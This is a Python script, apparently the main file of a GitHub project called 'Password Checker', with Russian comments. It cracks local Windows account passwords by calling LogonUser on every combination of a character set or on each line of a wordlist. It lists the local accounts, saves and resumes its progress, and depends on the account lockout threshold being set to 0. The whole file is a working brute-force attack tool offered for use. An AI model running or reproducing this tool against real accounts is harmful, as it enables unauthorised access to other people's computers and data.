import ctypes
from ctypes import wintypes

import win32api
import itertools
import sys
import os
import argparse
import mmap

from core import (
    list_users,
    LogonUser,
    MY_ENCODING,
    PROGRESS_FILE,
    LOGON32_PROVIDER_DEFAULT,
    LOGON32_LOGON_INTERACTIVE
)

from load_and_save_files import (
    load_progress, 
    save_progress,
    load_gif
)

from characters import characters_password

from test import (
    authentificate_user, 
    enter_username_and_password
)

EPILOG = """
Password Checker is a program that logs into a Windows account by iterating through the characters given to it by the user.\n
It works if the user has a null value of \"lock threshold value\" in secpol.msc.\n
Read more on Github: https://github.com/separeit894/password_checker/
"""

characters = ""
# Параметр по умолчанию, изменять можете тут или в файле progress.json
print_try = "y"
username = None
i = 1
step_save = 1
wordlist_file = ...

VERSION = "5.4.0"
parser = argparse.ArgumentParser(description=EPILOG)

subparsers = parser.add_subparsers(dest="command")
parser_get = subparsers.add_parser("get", help="Get item value")
parser_get.add_argument(
    "--file",
    action="store_true",
    help="a file in which the selection attempts will be recorded",
)
parser_get.add_argument(
    "--encoding",
    action="store_true",
    help="Gives the encoding that will be written to the file",
)
parser_get.add_argument(
    "--gif",
    action="store_true",
    help="Use if you have an executable file and the gif doesn't launch with the -load-gif (--load-gif) argument.",
)

parser_set = subparsers.add_parser("set", help="Set item value")
parser_set.add_argument("--encoding", type=str, help="Set the encoding to use")
parser_set.add_argument("--file", type=str, help="Example : test.json")


parser.add_argument(
    "-v", "--version", action="store_true", help="show version this program"
)
parser.add_argument(
    "-t",
    "--test",
    "--testAuth",
    action="store_true",
    help="runs a script that checks the username and password for authentication.",
)
parser.add_argument(
    "-c",
    "--charset",
    type=str,
    help="Specifies the characters that will be used to guess the password.",
)
parser.add_argument(
    "--print-try",
    choices=["y", "n"],
    type=str,
    help="If you select 'y', the match attempts will be shown every 250 matches. If 'n', each attempt will be shown. print",
)
parser.add_argument(
    "-u",
    "--user",
    type=str,
    help="Enter the username for which the password will be selected",
)
parser.add_argument(
    "-l",
    "--length",
    type=int,
    help="Enter this argument if you know the password length.",
)
parser.add_argument(
    "-load-gif",
    "--load-gif",
    action="store_true",
    help="Shows a gif file that disables the retry limiter.",
)

parser.add_argument(
    "--step",
    "--step-save",
    type=int,
    help="Determines after how many steps progress will be saved. By default, it immediately saves your progress after a completed attempt."
)

parser.add_argument(
    "-w",
    "--wordlist",
    type=str,
    help="The file from which passwords will be taken for brute-force cracking"
)


args = parser.parse_args()

PASSWORD_CHECKER_PYTHON = f"Password Checker Python : Version {VERSION}"
ABOUT_THIS_PROGRAM = "About this program : https://github.com/separeit894/password_checker"

if args.version:
    print(PASSWORD_CHECKER_PYTHON)
    print(ABOUT_THIS_PROGRAM)
    sys.exit(0)

if args.test:
    username, password = enter_username_and_password()
    authentificate_user(username, password)
    sys.exit(0)

if args.charset:
    characters = args.charset

if args.print_try:
    print_try = args.print_try

if args.user:
    username = args.user

if args.length:
    i = args.length
    
if args.step:
    step_save = args.step
    
if args.wordlist:
    characters = "wordlist"
    wordlist_file = args.wordlist

if args.command == "get":
    if args.encoding:
        from core import MY_ENCODING

        print(f"Encoding used : {MY_ENCODING}")
        sys.exit(0)

    if args.file:
        from core import PROGRESS_FILE

        print(f"File used : {PROGRESS_FILE}")
        sys.exit(0)

    if args.gif:
        from load_and_save_files import unload_gif

        unload_gif()
        sys.exit(0)

elif args.command == "set":
    if args.encoding:
        print(f"{type(args.encoding)} : {args.encoding}")
        from core import set_encoding

        set_encoding(args.encoding)
    if args.file:
        from core import set_file

        set_file(args.file)


if args.load_gif:
    load_gif()
    sys.exit(0)

THE_TEXT_ABOUT_THE_THRESHOLD_VALUE_OF_THE_LOCK = "Убедитесь в том что у вас 'Пороговое значение блокировки: 0', иначе у вас заблокируют учетную запись!\n"
print(THE_TEXT_ABOUT_THE_THRESHOLD_VALUE_OF_THE_LOCK)
GITHUB_AUTHOR = "Автор: separeit894\nCcылка на github: https://github.com/separeit894/\n"
print(GITHUB_AUTHOR)

users_list = list_users()


# Загрузка прогресса
def previous_progress():
    global username, i, try_id, tryed, characters, print_try

    progress = load_progress()
    if progress:
        username = args.user if args.user else progress["username"]
        i = args.length if args.length else progress["length"]
        try_id = progress["try_id"]
        tryed = progress["tryed"]
        characters = args.charset if args.charset else progress["characters"]
        print_try = args.print_try if args.print_try else progress["print_try"]
        
        return True
    
    else:
        i = args.length if args.length else 1
        try_id = 0
        tryed = []
        
        return False
        
previous_progress()

def enter_username_for_authentication():
    global username
    # Указываем учетную запись пользователя
    number = None
    find_username = True if args.user else False

    # Цикл будет действовать пока find_username будет false
    while not find_username:
        for i, line in enumerate(users_list):
            if number is None:
                print(f"{i} : {line}")
            else:
                if number == i:
                    username = users_list[number]
                    print(f"Учетная запись {username} найдена")
                    find_username = True
                    break

        if number is None:
            number = int(input("Напишите номер учетной записи: "))

RESULT_CALL_FUNC_ENT_USR_FOR_AUTH = "\033[1m \nenter_username_for_authentification() : The username input function was not called due to the successful loading of progress \033[0m \n"
enter_username_for_authentication() if not previous_progress() else print(RESULT_CALL_FUNC_ENT_USR_FOR_AUTH)

def enter_characters_for_authentication():
    global characters
    level = 0
    while True:
        if characters == "":
            if level > 1:
                print("\nВы должны что-то выбрать!\n")
            characters = characters_password(characters)
            level += 1
        else:
            break

RESULT_CALL_FUNC_ENT_CHAR_FOR_AUTH = "\033[1m \nenter_characters_for_authentification() : The character input function was not called due to the successful loading of progress \033[0m \n"
enter_characters_for_authentication() if not previous_progress() else print(RESULT_CALL_FUNC_ENT_CHAR_FOR_AUTH)

found = False

def result_user_account_login(username, password) -> bool:
    # Попытка входа в систему
    token = wintypes.HANDLE()
    result_try = LogonUser(
        username,
        None,  # Локальная учетная запись
        password,
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_PROVIDER_DEFAULT,
        ctypes.byref(token),
    )
    return result_try


def attempt_to_login_to_account(username, password, try_id, tryed, found, comparsion_step_save):
    
    if password not in tryed:
        try_id += 1
        
        result = result_user_account_login(username, password)
        
        # Если в файле progress.json, параметр print_try ( y )
        succes_exit = f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}"
        bad_selection = f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}"
        show_all = (print_try == "y")
        if result:
            print(succes_exit)
            found = True
            os.system("pause")
            sys.exit(0)
        else:
            if show_all or (try_id % 250 == 0):
                print(bad_selection)
                
            tryed.append(password)
                
        if win32api.GetLastError() == 1909:
            ERROR_1909 = "Ошибка 1909 означает, то что ваша учетная запись заблокировалась\nКонец работы"
            print(ERROR_1909)
            sys.exit(1909)

        # Сохраняем прогресс после каждой попытки
        if step_save == comparsion_step_save:
            save_progress(username, print_try, characters, i, try_id, tryed)
            comparsion_step_save = 1
        else:
            comparsion_step_save += 1
            
        return found, try_id, comparsion_step_save

def main():
    global found, i, try_id, step_save
    try:
        comparsion_step_save = 1 if not args.step else step_save
        # Цикл будет работать, пока не найдет подходящий пароль
        while not found:
            
            if not args.wordlist:
                # Циклом создаем новые пароли, characters - это тот список символов, которые вы выбрали в начале
                for password in itertools.product(characters, repeat=i):
                    password = "".join(password)
                    found, try_id, comparsion_step_save = attempt_to_login_to_account(username, password, try_id, tryed, found, comparsion_step_save) 
                    
            else:
                with open(wordlist_file, 'r', encoding=MY_ENCODING) as f:
                    with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as m:
                        for line in iter(m.readline, b''):
                            password = line.decode(MY_ENCODING).rstrip('\n')
                            i = len(password)
                            found, try_id, comparsion_step_save = attempt_to_login_to_account(username, password, try_id, tryed, found, comparsion_step_save) 
                            if m.tell() == m.size():
                                print("\nEND FILE FORDLIST\n")
                                sys.exit(0)
                    
            # Увеличиваем длину пароля, если не нашли подходящий
            if not found:
                i += 1
                
    # Если пользователь хочет прервать процесс
    except KeyboardInterrupt:
        save_progress(username, print_try, characters, i, try_id, tryed)
        print("Программа прервана. Прогресс сохранен.")
        os.system("pause")

    # Если произошла ошибка
    except Exception as ex:
        print("Произошла ошибка: ", ex)
        os.system("pause")


if __name__ == "__main__":
    main()
